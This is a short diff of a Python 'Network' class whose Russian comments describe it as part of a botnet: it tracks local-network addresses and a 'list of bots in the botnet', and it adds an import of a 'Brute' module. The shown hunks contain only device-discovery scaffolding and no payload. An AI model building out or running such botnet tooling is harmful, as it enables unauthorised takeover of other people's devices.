@@ -4,17 +4,17 @@ import re
 import socket
 # import keyboard
 import threading
-
+import Brute
 
 class Network:
     def __init__(self):
         self.host = socket.gethostname()
         self.ip = socket.gethostbyname(self.host)
         self.port = "8080"
-        self.OS = platform.system()
-        self.addr = []
-        self.bots = []
-        self.server = ""
+        self.OS = platform.system() #Операционная система
+        self.addr = []    #Все адреса в локальной сети
+        self.bots = []    #Список ботов в ботнете
+        self.server = ""  #Для клиента ip сервера
 
     def FindDevices(self):
         if self.OS == "Windows":
@@ -26,7 +26,7 @@ class Network:
             # print(MyAddr)
             # addr = [i for i in addr if i not in MyAddr]
             self.addr = addr
-            print(self.addr)
+            # print(self.addr)
 
     # перед работой сделать udp запросы по адресам, которые есть в self.addr
     def FindBots(self):
@@ -113,4 +113,4 @@ class Network:
         print(2)
 
 # Будущие фиксы
-# сервер отправляет сам себе запросы!
+# сервер отправляет сам себе запросы! Удалить адрес сервера self.ip из self.addr
